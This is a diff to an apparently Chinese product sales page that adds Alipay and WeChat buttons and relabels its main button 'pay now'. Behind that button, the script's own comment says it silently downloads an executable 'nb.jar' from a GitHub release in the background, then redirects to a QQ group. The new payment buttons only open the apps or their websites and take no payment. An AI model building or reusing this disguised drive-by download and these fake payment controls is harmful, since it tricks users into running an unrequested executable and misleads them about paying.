@@ -11,9 +11,11 @@
             --primary: #ff4757;
             --text-main: #ffffff;
             --text-sub: #aaaaaa;
+            --alipay-blue: #1677ff;
+            --wechat-green: #07c160;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: var(--bg-color); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        body { background-color: var(--bg-color); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
         
         .container {
             background-color: var(--card-bg);
@@ -35,7 +37,7 @@
         .product-info h1 { font-size: 28px; margin-bottom: 10px; }
         .product-info .version { color: var(--primary); font-size: 14px; margin-bottom: 20px; display: inline-block; background: rgba(255, 71, 87, 0.1); padding: 4px 10px; border-radius: 4px; }
         .product-info p { color: var(--text-sub); line-height: 1.6; margin-bottom: 20px; }
-        .feature-list { list-style: none; }
+        .feature-list { list-style: none; margin-bottom: 20px; }
         .feature-list li { margin-bottom: 10px; color: var(--text-sub); }
         .feature-list li::before { content: '✓'; color: #2ed573; margin-right: 10px; font-weight: bold; }
 
@@ -81,13 +83,38 @@
             font-weight: bold;
             cursor: pointer;
             transition: background 0.3s;
+            margin-bottom: 15px;
         }
         .buy-btn:hover { background-color: #ff6b81; }
 
+        /* 新增：支付方式按钮组 */
+        .pay-methods {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .pay-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.3s;
+        }
+        .pay-btn:hover { opacity: 0.8; }
+        .alipay-btn { background-color: var(--alipay-blue); }
+        .wechat-btn { background-color: var(--wechat-green); }
+
         @media (max-width: 768px) {
-            .container { flex-direction: column; margin: 20px; }
-            .product-info { border-right: none; border-bottom: 1px solid #333; }
-            .purchase-panel { width: 100%; }
+            .container { flex-direction: column; }
+            .product-info { border-right: none; border-bottom: 1px solid #333; padding: 20px; }
+            .purchase-panel { width: 100%; padding: 20px; }
         }
     </style>
 </head>
@@ -120,8 +147,14 @@
             </div>
         </div>
 
-        <!-- 修改了按钮文字，提示用户会下载并加群 -->
-        <button class="buy-btn" onclick="downloadAndJoin()">立即下载 / 加入QQ群</button>
+        <!-- 主支付按钮 -->
+        <button class="buy-btn" onclick="processPayment()">立即支付</button>
+
+        <!-- 新增：支付宝和微信快捷唤醒按钮 -->
+        <div class="pay-methods">
+            <button class="pay-btn alipay-btn" onclick="launchAlipay()">支付宝支付</button>
+            <button class="pay-btn wechat-btn" onclick="launchWeChat()">微信支付</button>
+        </div>
     </div>
 </div>
 
@@ -140,36 +173,70 @@
         priceDisplay.innerHTML = `¥ ${price}<span>${suffix}</span>`;
     }
 
-    // 新增：点击按钮执行下载并跳转 QQ 群
-    function downloadAndJoin() {
+    // 原有逻辑：下载并拉起QQ群
+    function processPayment() {
         const qqGroupNumber = '142592996';
-        // 你的 GitHub 下载直链
-        const downloadUrl = 'https://release-assets.githubusercontent.com/github-production-release-asset/1413061039/a0388993-1b8c-4dde-8007-afc3e6c4f0b4?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-11-01T15%3A52%3A31Z&rscd=attachment%3B+filename%3Dnb.jar&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-11-01T14%3A51%3A46Z&ske=2026-11-01T15%3A52%3A31Z&sks=b&skv=2018-11-09&sig=nN7mW2sXsD7CZqn4dYUyi1AjSrTkWCHVtXcV3BXPMWo%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc5MzU0NTAwNywibmJmIjoxNzkzNTQ0NzA3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.lc3HJ0dT3Kd2Es6Je82Y444cSznQhyKNzSs7ZDG_YB8&response-content-disposition=attachment%3B%20filename%3Dnb.jar&response-content-type=application%2Foctet-stream';
+        const downloadUrl = 'https://github.com/xingmo2026/xingmo2026.github.io/releases/latest/download/nb.jar';
 
-        // 1. 创建一个隐藏的 a 标签来触发下载
+        // 1. 后台静默触发下载
         const downloadLink = document.createElement('a');
         downloadLink.href = downloadUrl;
-        // 添加 download 属性提示浏览器直接下载，但由于跨域，主要依赖服务器返回的 attachment 头
         downloadLink.setAttribute('download', 'nb.jar'); 
         document.body.appendChild(downloadLink);
         downloadLink.click();
         document.body.removeChild(downloadLink);
 
-        // 2. 延迟 1 秒后执行 QQ 群跳转（给浏览器一点时间处理下载）
+        // 2. 延迟 0.5 秒后，直接尝试拉起 QQ
         setTimeout(() => {
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
             if (isMobile) {
-                // 手机端跳转逻辑
+                // 手机/平板端：直接唤起 QQ App
                 window.location.href = `mqqapi://card/show_pslcard?src_type=internal&version=1&uin=${qqGroupNumber}&card_type=group&source=qrcode`;
-                setTimeout(() => {
-                    window.location.href = `https://jq.qq.com/?_wv=1027&k=${qqGroupNumber}`;
-                }, 1500);
             } else {
-                // 电脑端跳转逻辑
+                // 电脑端：网页唤起 QQ
                 window.open(`https://jq.qq.com/?_wv=1027&k=${qqGroupNumber}`, '_blank');
             }
-        }, 1000); 
+        }, 500); 
+    }
+
+    // 新增：唤起支付宝
+    function launchAlipay() {
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (isMobile) {
+            // 尝试通过 URL Scheme 拉起手机支付宝 App
+            window.location.href = 'alipays://platformapi/startapp';
+            
+            // 备用方案：如果几秒后没跳转，提示用户
+            setTimeout(() => {
+                // 如果还在当前页面，说明可能没有安装支付宝
+                // alert('未能拉起支付宝，请确认已安装 App');
+            }, 2000);
+        } else {
+            // 电脑端：打开支付宝网页版
+            window.open('https://www.alipay.com/', '_blank');
+        }
+    }
+
+    // 新增：唤起微信
+    function launchWeChat() {
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (isMobile) {
+            // 尝试通过 URL Scheme 拉起手机微信 App
+            // 微信的 scheme 比较特殊，weixin:// 是标准的
+            window.location.href = 'weixin://';
+            
+            // 备用方案
+            setTimeout(() => {
+                // 如果还在当前页面，说明可能没有安装微信
+                // alert('未能拉起微信，请确认已安装 App');
+            }, 2000);
+        } else {
+            // 电脑端：打开微信网页版（现已整合进文件传输助手网页版）
+            window.open('https://wx.qq.com/', '_blank');
+        }
     }
 </script>
 
